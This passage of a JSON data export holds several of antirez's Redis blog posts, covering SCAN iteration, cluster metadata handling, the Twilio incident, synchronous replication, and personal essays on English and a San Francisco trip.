measurably slower than others once elements start to pile up. While Log(N) is small, with million of elements it starts to be a big enough number that cache misses summed together make a difference.  There was no easy way to say goodbye to hash tables.  However eventually Pieter applied one of the most powerful weapons the designer has in its hands: sacrifice, and send me a pull request for a new SCAN command.  The command was able to walk the key space incrementally, using a cursor that is returned back to the user after every call to SCAN, so it is a completely stateless affair. It is something like that:  redis 127.0.0.1:6379> flushall OK redis 127.0.0.1:6379> debug populate 33 OK redis 127.0.0.1:6379> scan 0 1) \"52\" 2)  1) \"key:29\"     2) \"key:13\"     3) \"key:9\"     4) \"key:12\"     5) \"key:28\"     6) \"key:30\"     7) \"key:26\"     8) \"key:14\"     9) \"key:21\"    10) \"key:20\" redis 127.0.0.1:6379> scan 52 1) \"9\" 2)  1) \"key:16\"     2) \"key:31\"     3) \"key:3\"     4) \"key:0\"     5) \"key:32\"     6) \"key:17\"     7) \"key:24\"     8) \"key:8\"     9) \"key:15\"    10) \"key:11\"  \u2026 and so forth until the returned cursor is 0 again \u2026  This is possible because SCAN does not make big promises, hence the sacrifice: it guarantees to return all the elements that are in the collection from the start to the end of the iteration, at least one time.  This means, for example, that:  1) Elements may be returned multiple times. 2) Elements added during the iteration may be returned, or not, at random.  It turns out that this is a perfectly valid compromise, and that at application level you can almost always do what is needed to play well with this properties. Sometimes the operation you are doing on every element are simply safe to re-apply, some other times you can just put a flag in your (for example) Hash in order to mark it as processed, or a timestamp perhaps, and so forth.  Eventually merged ===  Pieter did an excellent work, but the pull request remained pending forever (more than one year), because it relied on a complex to understand implementation. Basically in order to guarantee the previous properties with tables that can change from one SCAN call to the other, Pieter used a cursor that is incremented inverting the bits, in order to count starting from the most significant bits first. This is why in the example you see the returned cursor jumping forward and backward.  This has different advantages, including the fact that it returns a small number of duplicates when possible (by checking less slots than a more naive implementation). Eventually I studied his code and tried to find a simpler algorithm with the same properties without success, so what I did is to document the algorithm. You can read the description here in the dict.c file: https://github.com/antirez/redis/blob/unstable/src/dict.c#L663  After you do some whiteboard reasoning, it is not too hard to see how it works, but it is neither trivial, however it works definitely very well.  So with the code merged into unstable, I tried to generalize the implementation in order to work with all the other types in Redis that can be iterated this way, that are Hashes, Sets and Sorted Sets, in the form of additional commands named HSCAN, SSCAN, ZSCAN.  You may wonder why to have a ZSCAN. The reason is that while sorted sets are iterable in other ways, the specific properties of the SCAN iterator are not trivial to simulate by scanning elements by rank or score. Moreover sorted sets are internally implemented by a skiplist and an hash table, so we already had the hash table and to extend SCAN to sorted sets was trivial.  Patterns too! ===  SCAN and its variants can be used with the MATCH option in order to only return elements matching a pattern. I\u2019m also implementing the TYPE option in order to only return keys of a specific type.  This is almost for free, since SCAN does not guarantees to return elements at all, so what happens is that it scans something like 10 buckets of the hash table per call (by default, you can change this) and later filters the output. Even if the return value contains no elements, you keep iterating as soon as the returned cursor is non-zero.  As you can see this is something you could do client-side as well, by matching the returned elements with a pattern, but it is much faster to do it server side given that is a very common pattern, and one that users are already used to because of the KEYS command. And it requires less I/O of course, if the pattern only matches a small number of elements.  This is an example:  edis 127.0.0.1:6379> scan 0 MATCH key:1* 1) \"52\" 2) 1) \"key:13\"    2) \"key:12\"    3) \"key:14\" redis 127.0.0.1:6379> scan 52 MATCH key:1* 1) \"9\" 2) 1) \"key:16\"    2) \"key:17\"    3) \"key:15\"    4) \"key:11\" redis 127.0.0.1:6379> scan 9 MATCH key:1* 1) \"59\" 2) 1) \"key:10\"    2) \"key:1\"    3) \"key:18\" redis 127.0.0.1:6379> scan 59 MATCH key:1* 1) \"0\" 2) 1) \"key:19\"  In the last call the returned cursor is 0, so we ended the iteration.  Excited about it? I\u2019ve good news, this is going to be back ported into 2.8 since it is completely self contained code so if it is broken, it does not affect other stuff. Well not just that, there are very big companies that are using SCAN for some time now, so I\u2019m confident it\u2019s pretty stable.  Enjoy iterating!  Discuss this blog post on Hacker News: https://news.ycombinator.com/item?id=6633091 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-10-27T15:47:10Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5530.54163, "slug": "finally-redis-collections-are-iterable-77", "topics": []}}, {"model": "app.post", "pk": 78, "fields": {"title": "New Redis Cluster meta-data handling", "link": "http://antirez.com/news/62", "source": 1, "normalized_link": "antirez.com/news/62", "summary": "This blog post describes the new algorithm used in Redis Cluster in order to propagate and update metadata, that is hopefully significantly safer than the previous algorithm used. The Redis Cluster specification was not yet updated, as I'm rewriting it from scratch, so this blog post serves as a first way to share the algorithm with the community.  Let's start with the problem to solve. Redis Cluster uses a master - slave design in order to recover from nodes failures. The key space is partitioned across the different masters in the cluster, using a concept that we call \"hash slots\". Basically every key is hashed into a number between 0 and 16383. If a given key hashes to 15, it means it is in the hash slot number 15. These 16k hash slots are split among the different masters.  At every single time only one master should serve a given hash slot. Slaves just replicate the master dataset so that it is possible to fail over a master and put the cluster again into an usable state where all the hash slots are served by one node.  Redis Cluster is client assisted and nodes are not capable to forward queries to other nodes. However nodes are able to redirect a client to the right node every time a client tries to access a key that is served by a different node. This means that every node in the cluster should know the map between the hash slots and the nodes serving them.  The problem I was trying to solve is, how to take this map in sync between nodes in a safe way? A safe way means that even in the event of net splits, eventually all the nodes will agree about the hash slots configuration.  Another problem to solve was the slave promotion. A master can have multiple slaves, how to detect, and how to act, when a master is failing and a slave should be promoted to replace it?  Metadata is not data ====================  In the case of Redis Cluster handling of metadata is significantly different than the way the user data itself is handled. The focus of Redis Cluster is:  1) Speed. 2) No need for merge operations, so that it is semantically simple to handle the very large values typical of Redis. 3) The ability to retain most writes originating from clients connected to the majority of masters.  Given the priorities, Redis Cluster, like the vanilla single node version of Redis, uses asynchronous replication where changes to the data set are streamed to slave nodes with an asynchronous acknowledgement from slaves. In other words when a node receives a write, the client most of the times directly talk with the node in charge for the key hash slot, and the node has no other chatting to do with other nodes.  However this means that Redis Cluster is not a true CP system: there is a window where writes can be lost. The trivial case to lose a write is to write to a master that stops working after accepting our write and replying to the client, but before being able to propagate the write to its slaves.  This window is very small, in the sub-millisecond range. However when a client is partitioned away from the majority of the master nodes there is a bigger window to lose data, as a partitioned master will continue to accept writes for some time, while on the majority side the same master may be failed over by a slave. So when the partition will be fixed, the master will be reconfigured as a slave and writes will be lost.  Apart from the replicas, a key is stored into a single master node, so there is no need to agree or merge its value. Given the design, there is no need to use an agreement protocol in order to write or read data to/from the cluster. However metadata is a different story, we want that every node has a coherent vision of the cluster setup, and that the right configuration is eventually propagated to all the nodes even in case of failures and network partitions.  Using an agreement algorithm ============================  The simplest way to solve such a problem is to use a consensus algorithm such as Paxos or Raft, and this was the direction I was going to take. However implementing consensus algorithms is hard. Actually it is so hard that often years are needed for implementations to stabilize.  At some point I noticed something that makes the work of Redis Cluster nodes simpler, that is, information about hash slots is always idempotent. If hash slot 5 is served by A, and later because the configuration changes hash slot 5 is served by B, nodes don't need to know what happened, everything they need is that the configuration for an hash slot was updated.  This changes everything basically: agreement protocols are able to take a state machine synchronized by running the same sequence of operations in every node. If the state machine is deterministic, then the internal state will be the same in all the nodes eventually. However all the state Redis Cluster needs, for a given slot, can be embedded into a single packet.  Because of this we don't need a log of operations stored on disk, nor a way to make sure to fetch all the operations still not fetched, or to figure out what should be applied and what not, all the state can be copied in a single message. In short Redis Cluster does not require a full agreement protocol so I stolen just what I needed from Raft, and tried to figure out the rest.  Failure detection =================  In order to see if a node has issues, Redis Cluster still uses the old algorithm that is based on gossip. Nodes inform other nodes about the state of a few random nodes using ping / pong packets. These ping / pong packets are in turn used to check if a node is reachable from the point of view of the sender of the ping. If the (informal) majority of masters agree that a given node is not reachable, then the node is flagged as failing. I said \"informal\" as there is no true agreement here, but simply:  1) Every node flags other nodes are failing if the majority of master nodes signaled the node as down in a given time range. 2) Every node removes the flag if the node is back reachable and is a salve, or a master that after some time is still serving slots from our point of view (was not failed over).  The failure detection is completely informal and has the only property that eventually all the nodes will agree on the failure: either the majority of nodes will mark it as failing resulting into a chain effect that will force all the other nodes to mark the node as failing, OR there is no majority and if the node is reachable again everybody will clear the flag.  The point here is that the failure detection does not require any safety, it is only useful in order to trigger the safe part of the algorithm, that is, replacing the master with a slave and update the cluster configuration.  Slave promotion ===============  Promoting a slave must be a safe operation, and one that should ensure that the configuration change is propagated across the cluster as soon as possible.  Slave promotion is up to slaves and uses a mechanism very similar to the Raft algorithm leader election. This is what happens:  1) A slave detects its master is failing. 2) The slave will try to win the election in order to promote itself to master. 3) If it is successful, it will change its state and will advertise the new configuration. 4) If it is unsuccessful it will try again to win the election after some time.  Every slave will try to start the election at a slightly different time in order to avoid a split brain condition that will require a new election. Redis Cluster uses a random delay that is driven by the number of seconds a slave was disconnected from the master, in order to favor slaves that were able to talk with the master more recently (slaves with too old data don't try at all to get elected).  Every cluster node has the concept of currentTerm as in Raft, that is called currentEpoch in Redis Cluster. Every node tries to have a currentEpoch that is the highest found among other nodes, so this information is always added in ping /pong packets headers. Every time a node sees a currentEpoch of another node that is greater than its epoch, it updates its currentEpoch.  The election is like Raft: a slave that tries to get elected increments its currentEpoch and sends a failover-auth-request to every master hoping to get its vote. Masters refuse to vote if the master instance of the slave is not failing from the point of view of a given master, or if the currentTerm advertised by the slave is smaller than the currentTerm of the receiving master.  Also masters vote a single time for every epoch: this ensures that for every epoch we can have just a single winner, this is central both in the Raft algorithm and in the Redis Cluster slave election.  Basically, if a slave wins the election, it uses the epoch at which the election was won as the version of its configuration, and newer configurations always win over older configurations.  The configEpoch ===============  In order to make more clear how it works, we need to add some more information. Basically every ping / pong packet does not just publish the currentEpoch, but also the configEpoch, that is, the epoch at which the master started to serve its set of hash slots. Initially when a cluster is created every master uses a configEpoch of zero. As failover events happen, there will be nodes with greater configEpoch values.  As in the old algorithm, the ping and pong packets also carry a bitmap with the hash slots served by a given node. Since every node knows the last observed configEpoch of every other node, it can detect configuration changes to incorporate.  For instance if node B claims to serve hash slot 5 that was previously served by node A, but the configEpoch of node B is greater than the configEpoch we have for A, then we accept the new configuration.  The same mechanism is also used in order to reconfigure a reappearing master as a slave, or to reconfigure all the other slaves after a failover. The old master's served slots count will drop to zero, and the nodes will switch as replicas of the node that is serving the slots now.  The real algorithm used has more details that don't change the semantics, but make everything more fluid in common cases. For example after a slave wins an election it broadcasts a PONG to every node in order to make the configuration change faster, and to prevent other slaves from initiating a new useless election.  Similarly a master that was partitioned out from the majority for enough time (the same time needed to flag it as failing) stop accepting writes, and will not accept writes for a few more seconds even after the majority of masters is reachable again, in order to give some time to the other nodes to inform it of configuration changes. This makes less likely that a client with an old routing table will try and succeed to write to the returning master that is now failed over.  From the point of view of the code, the implementation is requiring a minor amount of code, as everything was already implemented in the old algorithm even if in a broken way, it was unsafe but the basic abstractions and message formats were ok.  All in all I'm failing in love with distributed programming and I hope to learn more in the next weeks... Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-09-26T15:46:48Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5471.0211411, "slug": "new-redis-cluster-meta-data-handling-78", "topics": []}}, {"model": "app.post", "pk": 79, "fields": {"title": "English has been my pain for 15 years", "link": "http://antirez.com/news/61", "source": 1, "normalized_link": "antirez.com/news/61", "summary": "Paul Graham managed to put a very important question, the one of the English language as a requirement for IT workers, in the attention zone of news sites and software developers [1]. It was a controversial matter as he referred to \"foreign accents\" and the internet is full of people that are just waiting to overreact, but this is the least interesting part of the question, so I'll skip that part. The important part is, no one talks about the \"English problem\" usually, and I always felt a bit alone in that side, like if it was a problem only affecting me, so in this blog post I want to share my experience about English.  [1] http://paulgraham.com/accents.html  A long story ---  I still remember me and sullivan (http://www.isg.rhul.ac.uk/sullivan/) both drunk in my home in Milan trying to turn an attack I was working on, back in 1998, in a post that was understandable for BUGTRAQ users, and this is the poor result we obtained: http://seclists.org/bugtraq/1998/Dec/79  Please note the \"Instead all others\" in the second sentence. I'm still not great at English but I surely improved over 15 years, and sullivan now teaches in US and UK universities so I imagine he is totally fluent (spoiler warning: I'm still not). But here the point is, we were doing new TCP/IP attacks but we were not able to freaking write a post about it in English. It was 1998 and I already felt extremely limited by the fact I was not able to communicate, I was not able to read technical documentation written in English without putting too much efforts in the process of reading itself, so my brain was using like 50% of its energy to just read, and less was left to actually understand what I was reading.  However in one way or the other I always accepted English as a good thing. I always advice people against translation efforts in the topic of technology, since I believe that it is much better to have a common language to document and comment the source code, and actually to obtain the skills needed to understand written technical documentation in English is a simple effort for most people.  So starting from 1998 I slowly learned to fluently read English without making more efforts compared to reading something written in Italian. I even learned to write at the same speed I wrote stuff in Italian, even if I hit a local minima in this regard, as you can see reading this post: basically I learned to write very fast a broken subset of English, that is usually enough to express my thoughts in the field of programming, but it is not good enough to write about general topics. I don't know most of the words needed to refer to objects you find in a kitchen for example, or the grammar constructs needed to formulate complex sentences, hypothetical structures, and so forth. As I now can communicate easily in the topic I care most, and in a way that other people can more or less understand everything I write, the pressure to improve has diminished greatly\u2026 However I recently discovered that this was the minor of my problems with English.  European English, that funny language ---  So while I managed to eventually write and read comfortably enough for my needs, I almost never experienced actual communication in an English speaking country until recently. Before that I always used English with other european (non UK) people, such as French, German, Spanish people. Now the English spoken in these countries is the English spoken at English school lessons\u2026 Phonetically it has almost nothing to do with American or UK English. They say it is \"BBC English\" but actually it is not. It is a phonetically greatly simplified English that uses UK English grammar.  *That* version of English, actually allows people from around the world to communicate easily. The basic grammar is trivial to grasp, and in a few months of practice you can talk. The sound of the words is almost the same in all the non-UK speaking countries in Europe. So it works great.  There is just one problem, it has nothing to do with the real English spoken in UK, US, Canada, and other countries where English is a native language.  English is a bit broken, after all ---  Now I've a secret for you, that is everything but a secret except nobody says it in the context of English VS The World: English is a broken language, phonetically. In Italy we have a long history, but a very late political unification. Different regions talk different dialects, and people have super strong accents. Before 1950, when the \"TV Language Unification\" happened, everybody was still taking with their *dialects* and italian was only mastered by a small percentage of people. Sicilian itself, the language talked the most by my family, predates Italian by centuries (http://en.wikipedia.org/wiki/Sicilian_language*).  Still, guess what, nobody has issues understanding one of another region, or even from a Switzerland canton. Italian is phonetically one of the simplest languages on the earth, and is full of redundancy. It has, indeed, a low information entropy and usually words are long with a good mix of consonants and vocals in every word. There are no special rules to pronounce a word, if you know the sound of every single letter, plus the sound of a few special combination of letters like \"gl\", \"sc\", you can basically pronounce 99.9% of the words correctly just reading them for the first time.  The fact that people from different English speaking countries have issues communicating is already a big hint about how odd is English phonetically. For instance for me and many other non native English speakers it is very very very hard to understand what the fuck an UK people is telling. North Americans are a lot simpler usually.  Because of this \"feature\" of English the problem for me is not just my accent, that is IMHO the simplest thing to fix if I'll try to fix it putting enough work into it, but the ability to understand what people are saying to me. IMHO the fact that Paul Graham refers to \"accents\" is a bad attitude of UK/US people in this regard, hey guys, you are not understanding us, we are not understanding what you say as well, and it is hard to find people that, once your understanding limits are obvious, will try to slow down the pace of the conversation. Often even if I say I did not understand, I'll get the same sentence repeated the same at speed of light.  Learning written english as a first exposure is the killer ---  In my opinion one fact that made me so slow learning English is the fact that I started reading English without never ever listening to it. My brain is full of associations between written words and funny sounds that really don't exist in the actual language. My advice is that if you are learning English now, start listening as soon as possible to spoken English.  The osx \"say\" program is a good assistant, it is able to pronounce in a decent way most English words. NEVER learn a new word without learning what is its sound.  Introvert or extrovert? ---  One of the things that shocked me the most with my experience with the English language is how not mastering a language can switch you into an introvert. I'm an extrovert in Italy where most people are extroverts, in Sicily where there are even more extroverts, and inside my family that is composed mostly of extroverts. I'm kinda of an attention whore I guess (I hope I'm not, actually, but well, I'm very extrovert). Now when I have to talk in English, I'm no longer an extrovert anymore because of the communication barrier, and I regret every time I've to go to a meeting, or to be introduced to another person. It is a nightmare.  It's too late, let's study English ---  English in my opinion is only simple grammatically, but is a bad pick as a common language. However the reality is, it already won, there is no time to change it, and it is a great idea to talk in English better, even if this means to put a lot of efforts into it. This is what I'm doing myself, I'm trying to improve.  Another reason I find myself really in need to improve my English is that in 10 years I'll likely no longer write code professionally, and a logical option is to switch into the management side of IT, or to handle big projects where you are not supposed to write the bulk of the code. Well, if you think you need English as a developer, you'll need it a lot more as you go in other divisions of a typical IT company, even if you \"just\" have to actually manage many programmers.  However as a native English speaker you should really realize that a lot of people are doing serious efforts to learn a language that is hard to learn: it is not an hobby, to master English is a big effort that a lot of people are trying to do to make communication simpler. Without to mention how trivial is to go back in the learning process as long as you stop talking / listening for a couple of weeks\u2026  My long term hope is that soon or later different accents could converge into a standard easy-to-understand one that the English speaking population could use as a lingua franca. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-09-01T15:46:14Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5423.0203856, "slug": "english-has-been-my-pain-for-15-years-79", "topics": []}}, {"model": "app.post", "pk": 80, "fields": {"title": "Twilio incident and Redis", "link": "http://antirez.com/news/60", "source": 1, "normalized_link": "antirez.com/news/60", "summary": "Twilio just released a post mortem about an incident that caused issues with the billing system:  http://www.twilio.com/blog/2013/07/billing-incident-post-mortem.html  The problem was about a Redis server, since Twilio is using Redis to store the in-flight account balances, in a master-slaves setup, with multiple slaves in different data centers for obvious availability and data safety concerns.  This is a short analysis of the incident, what Twilio can do and what Redis can do to avoid this kind of issues.  The first observation is that Twilio uses Redis, an in memory system, in order to save balances, so everybody will say \"WTF Twilio! Are you serious with your data?\". Actually Redis uses memory to serve data and to internally manipulate its data structures, but the incident has *nothing to do* with the durability of Redis as a DB. In fact Twilio stated that they are using the append only file that can be a very durable solution as explained here: http://oldblog.antirez.com/post/redis-persistence-demystified.html  The incident is actually centered around two main aspects of Redis:  1) The replication system. 2) The configuration.  I'll address they two things respectively.  Analysis of the replication issue ===  Redis 2.6 always needs a full resynchronization between a master and a slave after a connection issue between the two. Redis 2.8 addressed this problem, but is currently a release candidate, so Twilio had no way to use the new feature called \"partial resynchronization\".  Apparently the master became unavailable because many slaves tried to resynchronize at the same time.  Actually for the way Redis works a single slave or multiple slaves trying to resynchronize should not make a huge difference, since just a single RDB is created. As soon as the second slave attaches and there is already a background save in progress in order to create the first RDB (used for the bulk data transfer), it is put in a queue with the previous slave, and so forth for all the other slaves attaching. Redis will just produce a single RDB file.  However what is true is that Redis may use additional memory with many slaves attaching at the same time, since there are multiple output buffers to \"record\" to transfer when the RDB file is ready. This is true especially in the case of replication over WAN. In the Twilio blog post I read \"multiple data centers\" so it is possible that the replication process may be slow in some case.  The bottom line is, Redis normally does not need to go slow when multiple slaves are resynchronizing at the same time, unless something strange happens like hitting the memory limit of the server, with the master starting to swap and/or problems with very slow disks (probably EC2?) so that creating an RDB starts to mess with the ability to write to the AOF file.  However issues writing to the AOF are a bit unlikely to be the cause, since during the AOF rewrite there is the same kind of disk i/o stress, with one thread writing a lot of data to the new AOF, and the other (main) thread logging every new write to the AOF. Everything considered memory pressure seems more probable, but Twilio engineers can just comment with details about what happened, this will be an useful real-world data point for sure.  From the Twilio side, what is possible to do to minimize incidents, is to understand exactly why the master is not able, with the current architecture, to survive without serious loss of performance to many slaves resynchronizing.  From the Redis side, well, we had to do our homework and provide partial resynchronization *long time ago* probably, we finally have it in Redis 2.8, and it is very good that a few days ago I pushed forward the 2.8 release skipping all the other pending features for this release that will be postponed for the next release. Now we have the first release candidate, in a few weeks this should be a release in the hands of users.  The configuration ===  The other obvious problem, probably the biggest one, was restarting the master with the wrong configuration.  Again I think here there was an human error that was \"helped\" by a Redis non perfect mechanism.  Basically up to Redis 2.6 you had CONFIG SET to change the configuration by hand, so it was possible for example to switch the system from RDB to AOF for more data safety with just:  redis-cli CONFIG SET appendonly yes  However you had to change the configuration file manually in order to ensure that the change will affect the instance after the next restart. Otherwise the change is only in the current in memory configuration and a restart will bring you back to the old config.  Maybe this was not the case, but it is not unlikely that Twilio engineers modified the wrong redis.conf file or forgot to do it in some way.  Fortunately Redis 2.8 provides a better workflow for on-the-fly configuration changes, that is:  redis-cli CONFIG SET appendonly yes redis-cli CONFIG REWRITE  Basically the config rewriting feature will make sure to change the currently used configuration file, in order to contain the configuration changes operated by CONFIG SET, which is definitely safer.  In the end ===  I'll be happy to work with the Twilio engineers in the next weeks in order to understand the details and their requests and see how Redis can be improved to make incidents like this less likely to happen.  A real world test ===  I just tried to setup a master with AOF enabled, rotating disks, and a huge write load. Only trick is, it is bare metal entry-level hardware.  Then I put a steady load on it of 70k writes per second across 10 millions of keys.  Finally I tried to mass-resync four slaves form scratch multiple times.  Results:  $ redis-cli -h 192.168.1.10 --latency-history min: 0, max: 26, avg: 0.97 (1254 samples) -- 15.00 seconds range min: 0, max: 5, avg: 0.66 (1287 samples) -- 15.00 seconds range min: 0, max: 2, avg: 0.62 (1290 samples) -- 15.00 seconds range min: 0, max: 1, avg: 0.47 (1307 samples) -- 15.01 seconds range min: 0, max: 10, avg: 0.48 (1306 samples) -- 15.00 seconds range min: 0, max: 1, avg: 0.47 (1310 samples) -- 15.01 seconds range min: 0, max: 3, avg: 0.45 (1311 samples) -- 15.01 seconds range min: 0, max: 10, avg: 0.48 (1305 samples) -- 15.01 seconds range min: 0, max: 23, avg: 0.49 (1306 samples) -- 15.01 seconds range min: 0, max: 3, avg: 0.47 (1307 samples) -- 15.01 seconds range min: 0, max: 36, avg: 0.86 (1255 samples) -- 15.00 seconds range min: 0, max: 6, avg: 1.05 (1246 samples) -- 15.01 seconds range min: 0, max: 21, avg: 0.52 (619 samples)^C  As you can see there is no moment in which the server struggles with this load. During the test the load continued to be accepted at the rate of 70k writes/sec.  This test is in no way able to simulate the Twilio architecture, but the bottom line here is, Redis is supposed to handle this well with minimally capable hardware so something odd happened, or there was a low memory condition, or there was the \"EC2 effect\", that is, some very poor disk performance allowed for memory pressure. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-07-23T15:45:52Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5346.2198967, "slug": "twilio-incident-and-redis-80", "topics": []}}, {"model": "app.post", "pk": 81, "fields": {"title": "San Francisco", "link": "http://antirez.com/news/59", "source": 1, "normalized_link": "antirez.com/news/59", "summary": "Yesterday night I returned back home after a short trip in San Francisco. Before memory fades out and while my feelings are crisp enough, I'm writing a short report of the trip. The point of view is that of a south European programmer exposed for a few days to what is probably the most active information technology ecosystem and economy of the world.  Reaching San Francisco ===  If you want to reach San Francisco from Sicily, there are no direct flights helping you. My flight was a Lufthansa flight from Catania to Munich, and finally from Munich to San Francisco. This is a total of 15 hours flight, plus the stop in Munich waiting for the second flight.  Unfortunately the first flight had a delay big enough that I lost my connection. My trip was already pretty short, just four days, and this issue costed me one day reducing the total available time in SF to just 3 days... It's like to go to the other side of the world just to take a coffee.  However it's very rewarding to see Germans having an issue with precision, so I blamed a lot of people with the most heavy of the Sicilian accent... Just kidding :-) The reality is that the operators at the Catania airport, not payed by Lufthansa, said that among all the big operators Lufthansa is one of the best in terms of avoiding delays. Moreover in Munich I was \"protected\" in a nice enough hotel with good food and great beer.  I was not the only unlucky guy, there were other three north Americans headed to San Francisco that became my journey friends in no time, very cool people that allowed me to practice English some hours before reaching SF, recounted fun stories, and got drunk with me in the Munich -> SF flight.  Basically it's a long trip, and reaching the final destination is already an experience in itself. A direct flight would be much better: only one flight, and the process is \"atomic\", either you remain at the starting point or you get to the final destination, no chances to remain half-way unless the aircraft falls on the floor ;-)  The city ===  I'm a \"City guy\". In Sicily I live near Catania, that counting all the conurbation is like 1 million of inhabitants, not a lot but not a small town. San Francisco from this point of view is like my ideal city: people outside, gardens, large streets, bike lanes, many places where you can have a meal, and shops.  The Hotel, the Intercontinental in Howard street, was also great in every possible way, from the food to the staff that was always very professional and willing to help. The only bad thing about the Hotel was the gym, full of treadmills, without a pull-up bar, no barbells. A strange conception of fitness... I had to survive many days without doing a single deadlift.  During my permanence in SF I used a cab only two times for time constraints, I enjoyed a lot to walk around the city.  The people ===  During my time in SF I had the pleasure to visit Pivotal (my company), Adroll, Apcera, Twitter, and to attend the Redis drink up. I encountered an endless stream of smart *and* kind people, basically without exceptions. I assume that the SF guys not following The First Law Of Computing (that is \"don't be an asshole\") that I have the pleasure to meet on Twitter from time to time are a minority in the city.  Basically is a fantastic environment where the focus is only on getting things done in a friendly way, without rigid and useless things like the need to reach the office at 8am, but also without the employee habit of disappearing at 5pm during a deployment just because it's time to go home.  This is my philosophy as well, and it resonates very well with the way I also work at home.  Another very positive aspect is that, in the companies I visited, I never saw many meetings happening. Most of the programmers were at their desks working in a quiet enough environment. Basically it's not a coincidence that they get things done, there is the right setup, and my impression is that in average people work something like 40 hours per week like in Europe. I often read that in the US it's more like 50 or 60 hours, probably not in SF, or maybe I'm just wrong.  Women ===  I must admit that unfortunately there are not many women writing code in the average. I was lucky enough to meet a couple of outstanding women writing code, but all in all the percentage is not higher than the one in Italy. This is somewhat frustrating: from my point of view SF represents in many ways the \"future\" of the tech industry, they way it will probably be in many places in a few years. It is disappointing that I don't see much improvements in that regard, at the same time I've no recipes to suggest to improve things. I don't think the solution is to give some specific gender based advantage, but something should be done for example in the context of the educational system.  Children ===  In three days I heard multiple times the same story of families moving to SF and returning back to their homes in other places of US, Europe, India, or whatever, after a few months. I've no idea why this happens: from the outside it looks like a wonderful civilized city.  At the same time however there is something odd with the fact you earn 100k per year or more, and as a single you end without money to save at the end of the year. Probably that has something to do with the incompatibility between SF and families?  Also streets were full of people but it was hard to encounter children or pregnant women, this is another thing that sounds very strange from an outsider.  Food ===  Food was very good in my company, in the companies I visited (often for lunch), and when I met people in public places. I was not happy only with Greek yogurt that apparently is not the same stuff as I use to purchase here (I use the Fage brand), and in general yogurt was more like a dessert-looking thing.  Also cereals were full of sugar, and people used to drink in one day the amount of coke that in Sicily you drink in one year.  Fruit, especially apples and red fruits, were excellent, and the fruit & nuts bars completely awesome in some cases (I don't recall the brands I liked most).  The coffee is very different than the Italian one, but when it's made in the right way, it is good for me, just not as coffee as I intent it, but as another thing. However the side effect is that apparently it is a lot more caffeine rich in relation to the amount you drink in those big cups, and this caused me some issue.  My English ===  Even if a few people reported that I improved compared to when we met the previous time, the reality is that my English was the only real pain point, again. UK people are especially hard for me to understand, and I guess the opposite is also true. Fixing the language if you don't practice it is either impossible or requires a lot of time, probably I'll star to travel more. For example instead of always refusing the invitations I think I'll go to conferences much more.  Conclusion ===  It's not the first time I visit SF, I already visited the city one time a few years ago, but this is the first time I move around and meet people freely, since in my last trip I stayed mainly in Palo Alto.  I think that even if the climate is a bit odd, I would stay in SF itself if I would move in the bay area, even if probably it is going to be very expansive.  It really is a wonderful city and I hope to return visiting it soon instead of waiting three years again.  I want to say thank you to everybody I met during my trip: you are very gentle and friendly, I enjoyed it. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-06-15T15:45:31Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5273.25943, "slug": "san-francisco-81", "topics": []}}, {"model": "app.post", "pk": 82, "fields": {"title": "Exploring synchronous replication in Redis", "link": "http://antirez.com/news/58", "source": 1, "normalized_link": "antirez.com/news/58", "summary": "Redis uses streamed asynchronous replication, that's one of the simplest forms of replication you can imagine: a continuos stream of writes is sent to the slaves, without waiting for the slaves to process the writes in any way before replying to the client.  I always gave that almost for granted, as I always assumed Redis was not a good match for synchronous replication, that has an higher latency. However recently I tried to fix another issue with Redis replication, that is, timeouts are all up to the slave.  This is how it used to work:  1) Master sends data to slaves. However sometimes there is no data to send (no write traffic). We still need to send something to slaves in order to avoid slaves will detect a timeout. 2) So a master periodically sends PINGs to slaves as well, every 10 seconds by default. 3) Detection of a broken replication link is up to the slaves that will close the connection when a timeout is detected. 4) Masters are able to detect errors in the replication link only when reported by the operating system as a socket error.  So the ability of masters to detect errors in the replication link was pretty limited in Redis 2.6, and this is BAD. There are many kind of broken links that will result in no error raised in the socket, but still we end accumulating writes for a slave that is down. The only defense against this was the ability of Redis 2.6 to detect when the output buffer was too big, and close the connection before to use all the available memory as slave output buffers.  Pinging back ===  In order to fix this issue the most natural thing to do is to also ping from slave to master, so that the master can be aware of slaves, otherwise the slave -> master communication is completely zero, as slaves don't reply to write commands sent by a master in any way to save bandwidth.  However I was not very happy with sending just PING, since it was possible to send something way more useful, that is, the current *replication offset*. The replication offset is a new concept we have in 2.8 with PSYNC. Basically every master has a 64 bit global counter, about how much replication stream it produced. Moreover the replication stream is identical for all the slaves, so every slave shares the same global replication offset with the master.  The replication offset is primarily used by PSYNC, so that slaves can request a partial resynchronization asking the master to send data starting from a given offset, that is, the last offset that the slave received.  So instead of sending PINGs I made slaves pinging the masters with a new command:       REPLCONF ACK   This way the master is aware of the amount of replication stream processed so far, and as a result it knows the \"lag\" of the slave. This is how it looks like when we ask a slave for \"INFO replication\":      $ redis-cli info replication     # Replication     role:master     connected_slaves:1     slave0:127.0.0.1,6380,online,121483     master_repl_offset:121483     repl_backlog_active:1     repl_backlog_size:1048576     repl_backlog_first_byte_offset:2     repl_backlog_histlen:121482  As you can see the offset (last element) of slave0 is the same as master_repl_offset. So the slave is perfectly aligned.  Great, so far so good, but wait, isn't this half of what you need to implement synchronous replication?  Synchronous replication the easy way ===  So if we know the offset a slave processed so far, we could implement a new feature in Redis transactions, like that:       MULTI     MINREPLICAS 3 60     SET foo bar     EXEC  Here MINREPLICAS would tell Redis, make the command return only when my write reached the master and at least two slaves. The first argument is the number of replicas, the second is a timeout, as we can't wait forever if there are not enough slaves accepting the write.  Implementing this is simple:  1) After the master processes the command, we save the current replication offset. 2) We also send REPLCONF GETACK to every slave in order to receive an ACK ASAP (otherwise sent every second). 3) We block the client, similarly to what happens when BLPOP is 